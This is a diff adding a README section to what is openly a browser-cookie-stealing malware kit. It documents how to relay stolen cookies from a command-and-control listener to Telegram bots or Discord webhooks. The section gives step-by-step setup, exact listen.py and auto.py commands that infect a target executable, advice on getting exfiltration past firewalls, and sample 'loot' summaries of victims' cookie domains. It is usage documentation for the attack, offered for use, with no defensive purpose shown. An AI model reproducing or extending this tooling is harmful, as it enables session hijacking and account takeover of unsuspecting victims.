@@ -63,6 +63,106 @@ auto.bat
 
 ---
 
+## Relay: Telegram & Discord
+
+The listener (`listen.py`) can forward a summary of every received cookie batch to
+Telegram or Discord. This is useful when the attacker's C2 port is firewalled —
+the payload still POSTs to your listener over HTTP, and the listener re-sends a
+summary to Telegram/Discord over HTTPS (which passes most firewalls).
+
+Both relays are **optional** — if no `--telegram` or `--discord` flag is passed,
+the listener just saves cookies to `loot/` as usual.
+
+### Telegram setup
+
+1. **Create a bot** (takes 30 seconds):
+   - Open Telegram, search for **@BotFather**
+   - Send `/newbot`
+   - Pick a name and username (e.g. `mycookielog_bot`)
+   - BotFather replies with an **API token** like `7123456789:AAH...long_string...`
+
+2. **Get your chat ID** (so the bot knows who to message):
+   - Send any message to your new bot (e.g. "hi")
+   - Open this URL in a browser (replace `<TOKEN>` with your bot token):
+     ```
+     https://api.telegram.org/bot<TOKEN>/getUpdates
+     ```
+   - Look for `"chat":{"id": 987654321` in the JSON — that number is your chat ID
+
+3. **Run the listener with relay**:
+   ```bat
+   python listen.py 9090 --telegram 7123456789:AAH...long_string...:987654321
+   ```
+   Format: `--telegram <bot_token>:<chat_id>`
+
+   Or via `auto.py` (starts listener + infects in one command):
+   ```bat
+   python auto.py "GET UPSTAIRS (64bit)" --telegram 7123456789:AAH...long_string...:987654321
+   ```
+
+4. **What you receive**: when the victim runs the infected exe, you get a Telegram
+   message like:
+   ```
+   cookielog: 680 cookies received
+
+   Top domains:
+     312  google.com
+     145  youtube.com
+      89  github.com
+      ...
+   Full JSON: loot/cookies.json
+   ```
+
+### Discord setup
+
+1. **Create a webhook** (takes 10 seconds):
+   - Open Discord, go to the server where you want notifications
+   - **Server Settings** → **Integrations** → **Webhooks** → **New Webhook**
+   - Pick a name (e.g. "cookielog"), pick a channel
+   - Click **Copy Webhook URL** — it looks like:
+     ```
+     https://discord.com/api/webhooks/1234567890/abc-def-ghi...
+     ```
+
+2. **Run the listener with relay**:
+   ```bat
+   python listen.py 9090 --discord https://discord.com/api/webhooks/1234567890/abc-def-ghi...
+   ```
+   Or via `auto.py`:
+   ```bat
+   python auto.py "GET UPSTAIRS (64bit)" --discord https://discord.com/api/webhooks/1234567890/abc-def-ghi...
+   ```
+
+3. **What you receive**: when cookies arrive, the Discord webhook posts a message like:
+   ```
+   cookielog: **680 cookies** received
+
+   Top domains:
+   `  312`  google.com
+   `  145`  youtube.com
+   `   89`  github.com
+   ...
+   ```
+
+### Combining both
+
+You can use both relays at the same time:
+
+```bat
+python auto.py "GET UPSTAIRS (64bit)" --telegram 7123456789:AAH...:987654321 --discord https://discord.com/api/webhooks/123/abc
+```
+
+### Notes
+
+- The relay sends a **summary** (top 15 domains + cookie count), not the full cookie
+  JSON — the full data is still saved in `loot/cookies.json` on the listener side.
+- Discord has a 2000-character message limit; the summary is truncated to 1900 chars.
+- The relay uses Python's `urllib.request` (HTTPS) — no extra pip packages needed.
+- If the relay fails (bad token, wrong chat ID, network error), the listener logs
+  the error but **still saves cookies locally** — no data is lost.
+
+---
+
 ## What's New
 
 ### v2 — payload improvements (current)
